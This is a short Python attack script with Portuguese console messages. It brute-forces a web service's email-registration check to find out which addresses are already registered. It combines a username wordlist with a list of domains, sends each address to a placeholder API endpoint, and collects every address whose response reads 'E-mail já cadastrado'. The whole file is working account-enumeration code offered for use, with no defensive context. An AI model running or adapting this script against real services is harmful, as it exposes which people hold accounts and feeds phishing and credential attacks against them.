#!/usr/bin/python3
#
# MASS Brute for EMAIL Checking

import requests
import time

flood = 0
flood_request = ''
emails_leaked = []
qnt_emails_leaked = 0

print("[+] Iniciado MASS Brute Flooding... [+]")
time.sleep(3)
print("[+] Abrindo wordlist... [+]")
arquivo = open("/home/israel-kali/wordlist/wordlist_email", "r")
arquivo_domain = open("/home/israel-kali/wordlist/domains", "r")
time.sleep(3)

for linha in arquivo_domain.readlines():
    domains = linha
    for linha in arquivo.readlines():
        wordlist = linha
        print("[+] Armezando próximo payload... [+]")
        payloads = (f"{wordlist}@{domains}")
        payload = payloads.replace('\n','')
        print("[*] Enviando payload... [*]") 
        urls =  (f"https://url/v1/users/email?email={payload}")
        url = urls.replace('\n','')
        flood_request = requests.get(url)
        print(f"[+] Ultimo payload enviado: {payload} [+]")
        print(f"[+] Ultima resposta do servidor: {flood_request.text} [+]")
        response = flood_request.text
        if "E-mail já cadastrado" in response:
            emails_leaked.append(payload)
            qnt_emails_leaked = qnt_emails_leaked + 1
            msg_qnt_emails = (f"[*] Quantidade de e-mails descobertos: {qnt_emails_leaked} [*]")
            msg_qnt_emails_rv_new_line  = msg_qnt_emails.replace('\n','')
            time.sleep(5)
            print("[*] E-MAIL LEAKED [*]")
            print(msg_qnt_emails_rv_new_line)
            print("[+] Printando lista com os emails descobertos.... [+]")
            print(emails_leaked)
            time.sleep(5)
time.sleep(3)
print("[+] SCAN Finalizado com sucesso... [+]")
msg_qnt_emails = (f"[*] Quantidade de e-mails descobertos: {qnt_emails_leaked} [*]")
msg_qnt_emails_rv_new_line  = msg_qnt_emails.replace('\n','')
print(msg_qnt_emails_rv_new_line)
print("[+] Printando lista com os emails descobertos.... [+]")
print(emails_leaked)

arquivo.close()
arquivo_domain.close()